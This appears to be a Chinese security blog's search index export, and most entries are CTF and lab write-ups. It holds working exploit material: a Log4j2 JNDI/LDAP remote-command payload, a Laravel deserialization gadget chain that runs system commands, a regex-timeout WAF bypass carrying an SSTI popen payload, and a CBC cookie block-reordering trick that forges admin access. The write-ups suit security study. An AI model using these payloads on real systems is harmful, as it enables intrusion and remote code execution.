<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Apache Log4j2远程命令执行复现</title>
    <url>/2021/12/15/Apache-Log4j2%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>Apache Log4j2远程命令执行复现<a id="more"></a></p>
<h1 id="启动靶场环境"><a href="#启动靶场环境" class="headerlink" title="启动靶场环境"></a>启动靶场环境</h1><p>直接用vulfocus启一个环境。<br>官网地址：<a href="http://vulfocus.fofa.so/">http://vulfocus.fofa.so/</a></p>
<img src="http://img.npfs06.top/20211215190204.png" style="zoom:80%;">



<h1 id="用JNDIExploit启一个ldap的服务"><a href="#用JNDIExploit启一个ldap的服务" class="headerlink" title="用JNDIExploit启一个ldap的服务"></a>用JNDIExploit启一个ldap的服务</h1><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">java</span> -jar JNDIExploit-<span class="number">1</span>.<span class="number">3</span>-SNAPSHOT.jar -l <span class="number">32703</span> -p <span class="number">32701</span> -i <span class="number">0.0.0.0</span></span><br></pre></td></tr></table></figure>
<img src="http://img.npfs06.top/20211215190254.png" style="zoom:80%;">

<h1 id="发包"><a href="#发包" class="headerlink" title="发包"></a>发包</h1><p>payload更改如下：</p>
<figure class="highlight roboconf"><table><tr><td class="code"><pre><span class="line">payload=$&#123;<span class="attribute">jndi</span>:ldap://xxx<span class="variable">.xxx</span><span class="variable">.xxx</span><span class="variable">.xxx</span>:32703/TomcatBypass/TomcatEcho&#125;</span><br></pre></td></tr></table></figure>
<p>数据包如下：（在请求头中添加cmd字段，后面跟上需要执行的命令即可。）</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/hello</span>  <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> vulfocus.fofa.so:41624</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">cmd</span><span class="punctuation">: </span>whoami</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>47</span><br><span class="line"></span><br><span class="line">payload=$&#123;jndi:ldap://xxx.xxx.xxx.xxx:30703/TomcatBypass/TomcatEcho&#125;</span><br></pre></td></tr></table></figure>
<p>注意Content-Type的类型为：<code>application/x-www-form-urlencoded</code></p>
<p><strong>成功回显命令：</strong></p>
<img src="http://img.npfs06.top/20211215190740.png" style="zoom:80%;">]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
  </entry>
  <entry>
    <title>2021MRCTF web</title>
    <url>/2021/04/17/2021MRCTF-web/</url>
    <content><![CDATA[<p>2021MRCTF web writeup<a id="more"></a></p>
<h2 id="ez-larave1"><a href="#ez-larave1" class="headerlink" title="ez_larave1"></a>ez_larave1</h2><p>全局搜索<code>unserialize</code></p>
<p><img src="https://img.npfs06.top/20210417185528.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Exp来自chamd5 wp</span></span><br><span class="line"><span class="comment">//gadgets.php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$command</span>, <span class="variable">$parameters</span>, <span class="variable">$class</span>, <span class="variable">$app</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = <span class="variable">$command</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = <span class="variable">$parameters</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = <span class="variable">$class</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = <span class="variable">$app</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Auth</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">GenericUser</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">attributes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$attributes</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;attributes = <span class="variable">$attributes</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">hasBeenBootstrapped</span> = <span class="title">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$bindings</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$bind</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;bindings = <span class="variable">$bind</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Routing</span>\<span class="title">Loader</span>\<span class="title">Configurator</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CollectionConfigurator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">parent</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$collection</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$prefixes</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$parent</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;prefixes = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parent = <span class="variable">$parent</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;collection = <span class="keyword">new</span> \Symfony\Component\Routing\RouteCollection(<span class="keyword">array</span>(<span class="string">&quot;12end&quot;</span> =&gt; <span class="string">&quot;12end&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">ValidGenerator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">generator</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$validator</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$maxRetries</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$validator</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;generator = <span class="keyword">new</span> \Symfony\Component\Routing\RouteCollection(<span class="keyword">array</span>(<span class="string">&quot;12end&quot;</span> =&gt; <span class="string">&quot;12end&quot;</span>));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;validator = <span class="variable">$validator</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;maxRetries = <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Routing</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">RouteCollection</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">FnStream</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">_fn_close</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_fn_close=<span class="variable">$f</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">payload</span> = <span class="title">new</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>\<span class="title">PendingCommand</span>(</span><br><span class="line">        &quot;system&quot;, array(&#x27;cat /flag&#x27;),</span><br><span class="line">        <span class="keyword">new</span> Illuminate\Auth\GenericUser(<span class="keyword">array</span>(<span class="string">&quot;expectedOutput&quot;</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;0&quot;</span> =&gt; <span class="string">&quot;1&quot;</span>), <span class="string">&quot;expectedQuestions&quot;</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;0&quot;</span> =&gt; <span class="string">&quot;1&quot;</span>))),</span><br><span class="line">        <span class="keyword">new</span> Illuminate\Foundation\Application(<span class="keyword">array</span>(<span class="string">&quot;Illuminate\Contracts\Console\Kernel&quot;</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;concrete&quot;</span> =&gt; <span class="string">&quot;Illuminate\Foundation\Application&quot;</span>)))</span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> GuzzleHttp\Psr7\FnStream(<span class="keyword">array</span>(<span class="variable">$payload</span>, <span class="string">&quot;run&quot;</span>));</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><img src="http://img.npfs06.top/20210417184924.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="wwwafed-app"><a href="#wwwafed-app" class="headerlink" title="wwwafed_app"></a>wwwafed_app</h2><p>主要代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/source</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request,render_template,url_for</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"><span class="keyword">import</span> requests,base64,shlex,os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/waf&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wafsource</span>():</span></span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;waf.py&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/source&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">appsource</span>():</span></span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/api/spider/&lt;url&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spider</span>(<span class="params">url</span>):</span></span><br><span class="line">	url = base64.b64decode(url).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">	safeurl = shlex.quote(url)</span><br><span class="line">	block = os.popen(<span class="string">&quot;python3 waf.py &quot;</span> + safeurl).read()</span><br><span class="line">	<span class="keyword">if</span> block == <span class="string">&quot;PASS&quot;</span>:</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			req = requests.get(<span class="string">&quot;http://&quot;</span>+url,timeout=<span class="number">5</span>)</span><br><span class="line">			<span class="keyword">return</span> Template(<span class="string">&quot;访问成功!网页返回了&#123;&#125;字节数据&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(req.text))).render()</span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">			<span class="keyword">return</span> Template(<span class="string">&quot;访问&#123;&#125;失败！&quot;</span>.<span class="built_in">format</span>(safeurl)).render()</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> Template(<span class="string">&quot;WAF已拦截，请不要乱输入参数！&quot;</span>).render()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">5000</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/waf</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re,sys</span><br><span class="line"><span class="keyword">import</span> timeout_decorator</span><br><span class="line"></span><br><span class="line"><span class="meta">@timeout_decorator.timeout(<span class="params"><span class="number">5</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">url</span>):</span></span><br><span class="line">	<span class="comment"># only xxx.yy-yy.zzz.mrctf.fun allow</span></span><br><span class="line">	pat = <span class="string">r&#x27;^(([0-9a-z]|-)+|[0-9a-z]\.)+(mrctf\.fun)$&#x27;</span></span><br><span class="line">	<span class="keyword">if</span> re.match(pat,url) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">		print(<span class="string">&quot;BLOCK&quot;</span>,end=<span class="string">&#x27;&#x27;</span>) <span class="comment"># 拦截</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		print(<span class="string">&quot;PASS&quot;</span>,end=<span class="string">&#x27;&#x27;</span>) <span class="comment"># 不拦截</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		waf(sys.argv[<span class="number">1</span>])</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		print(<span class="string">&quot;PASS&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>这里有一个<code>@timeout_decorator.timeout(5)</code></p>
<p>每个正则有着五秒的执行时间限制，超出时间默认采取放行策略。</p>
<p>这里可以采用正则最大回溯限制来绕过</p>
<p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        commd = <span class="string">&quot;&quot;&quot;node.mrctf.fun&quot;&quot;&quot;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">1000</span>+<span class="string">&quot;&quot;&quot;&#123;&#123;a.__init__.__globals__.__builtins__.__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#125;&#125;&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment">#  pat = r&#x27;^(([0-9a-z]|-)+|[0-9a-z]\.)+(mrctf\.fun)$&#x27;</span></span><br><span class="line">        <span class="comment"># print()</span></span><br><span class="line">        burp0_url = <span class="string">&quot;http://node.mrctf.fun:15000/api/spider/&quot;</span> + base64.b64encode(commd.encode()).decode()</span><br><span class="line">        proxies = &#123;</span><br><span class="line">            <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://node.mrctf.fun:15000/&quot;</span>&#125;</span><br><span class="line">        r = requests.get(burp0_url, headers=burp0_headers)</span><br><span class="line">        print(r.text)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Write up</category>
      </categories>
  </entry>
  <entry>
    <title>BSidesCF 2019 Mixer</title>
    <url>/2020/07/30/BSidesCF-2019-Mixer/</url>
    <content><![CDATA[<p>很秀的一道题，需要密码学的知识，学到了<a id="more"></a></p>
<p>第一步，登入，登入成功后提示要使<code>is_admin?</code>为1，所以我们要做的就是让其为1</p>
<p><img src="https://img.npfs06.top/20210405212337.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>抓包，修改下cookie的user (这里为什么要修改cookie，也许题目最开始的那行小字就是提示吧。。<code>Note: the &quot;signature&quot; and &quot;rack.session&quot; cookies are not part of the challenge!</code>)</p>
<p>扩展：这里需要了解一下<a href="https://zh.wikipedia.org/wiki/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F" target="_blanket">分组密码工作模式</a></p>
<p>本题主要是CBC加密</p>
<p><img src="http://img.npfs06.top/20210405212346.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>我们通过修改user,将一组16进制对调，可以发现报错，多尝试几次，可以推测出解码为</p>
<blockquote>
<p>{“first_name”:”admin”,”last_name”:”admin”,”is_admin”:0}</p>
</blockquote>
<p>所以我们需要的就是构造</p>
<blockquote>
<p>{“first_name”:”admin”,”last_name”:”admin”,”is_admin”:1}</p>
</blockquote>
<p>这里需要知道CBC一般是16字节为一个块</p>
<p>我们只要构造：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;first_name&quot;</span>:<span class="string">&quot;A</span></span><br><span class="line"><span class="number">1.00000000000000</span></span><br><span class="line"><span class="string">&quot;,&quot;</span>last_name<span class="string">&quot;:&quot;</span>x</span><br><span class="line">xxx<span class="string">&quot;,&quot;</span>is_admin<span class="string">&quot;:</span></span><br><span class="line"><span class="number">0</span>&#125;</span><br><span class="line">一共<span class="number">5</span>组</span><br></pre></td></tr></table></figure>
<p>然后将第2组移到第5组之前，即</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;first_name&quot;</span>:<span class="string">&quot;A1.00000000000000&quot;</span>,<span class="attr">&quot;last_name&quot;</span>:<span class="string">&quot;paww&quot;</span>,<span class="attr">&quot;is_admin&quot;</span>:<span class="number">1.000000000000000</span>&#125;</span><br></pre></td></tr></table></figure>
<p>而 1.000000000000000 == 1 ，即可成功绕过admin登入</p>
<p><img src="http://img.npfs06.top/20210405212354.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>抓包</p>
<p><img src="https://img2020.cnblogs.com/blog/1999159/202007/1999159-20200730112645201-2057796280.png"></p>
<p>这里的user为</p>
<blockquote>
<p>74ba95cdeaef9e38fdd0543be7873714ede75aa3f199aec8b4cfdee00084b153713bc8a476f7029e75a30074d7ad2414e95d4866feba88df47630671eb7806b43c8bf4d5fa9ff12561cdd044cf52941c</p>
</blockquote>
<p>因为CBC是16字节为一组，转为16进制就是32个字符为一块，所以第二块就是</p>
<p>[32:64]</p>
<p>所以写个脚本即可</p>
<p><img src="https://img.npfs06.top/20210405212402.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>将变换后的cookie替换user的值即可得到flag</p>
<p><img src="https://img.npfs06.top/20210405212416.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
]]></content>
      <categories>
        <category>Write up</category>
      </categories>
  </entry>
  <entry>
    <title>CSS</title>
    <url>/2020/04/05/CSS/</url>
    <content><![CDATA[<p>以前学css时做的笔记,啥也没记..<a id="more"></a></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;1.jpg&quot;</span>);</span></span><br><span class="line"><span class="css">        <span class="attribute">background-size</span>: cover;</span></span><br><span class="line"><span class="css">        <span class="attribute">background-repeat</span>: no-repeat;</span></span><br><span class="line"><span class="css">        <span class="attribute">font-size</span>: <span class="number">20px</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="css">    <span class="selector-tag">p</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">margin-top</span>: <span class="number">2px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">color</span>:white;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="css">    <span class="selector-tag">textarea</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">margin</span>:<span class="number">30px</span> <span class="number">5px</span> <span class="number">15px</span> <span class="number">240px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">background-color</span>:dimgray ;</span></span><br><span class="line"><span class="css">        <span class="attribute">padding</span>: <span class="number">8px</span> <span class="number">0px</span> <span class="number">0px</span> <span class="number">8px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="css">        <span class="attribute">overflow</span>: hidden;</span></span><br><span class="line"><span class="css">        <span class="attribute">resize</span>: none;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="css">    <span class="selector-tag">form</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">margin</span>: <span class="number">0px</span> <span class="number">0px</span> <span class="number">0px</span> <span class="number">260px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">color</span>: azure;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="css">    <span class="selector-tag">input</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">margin</span>: <span class="number">0px</span> <span class="number">0px</span> <span class="number">0px</span> <span class="number">20px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">background-color</span>:transparent;</span></span><br><span class="line"><span class="css">        <span class="attribute">border</span>: <span class="number">1px</span> solid;</span></span><br><span class="line"><span class="css">        <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">color</span>: lavender;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="css">    <span class="selector-tag">textarea</span><span class="selector-pseudo">::placeholder</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">color</span>:<span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.5</span>);</span></span><br><span class="line"><span class="css">        <span class="attribute">font-size</span>: <span class="number">12px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">resize</span>:unset;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span>&gt;</span>hello world!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">   </span><br><span class="line">   <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">rows</span>=<span class="string">&quot;15&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;70&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;恭喜你 来到第二关&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;1.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;value1&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;as&quot;</span> <span class="attr">type</span>=<span class="string">&quot;username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username1&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;value2&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>前端</category>
      </categories>
  </entry>
  <entry>
    <title>CTF bugku 论剑场 web20</title>
    <url>/2020/04/13/CTF-bugku-%E8%AE%BA%E5%89%91%E5%9C%BA-web20/</url>
    <content><![CDATA[<p>最近经常做到过这种题目，写个笔记记录一下<br>一般这种题目，可以多刷新几次页面看看，且题目提示为动态密文</p>
<a id="more"></a>刷新页面可以发现每次动态密文都不同
<p>题目说提交对应密文，python脚本走起</p>
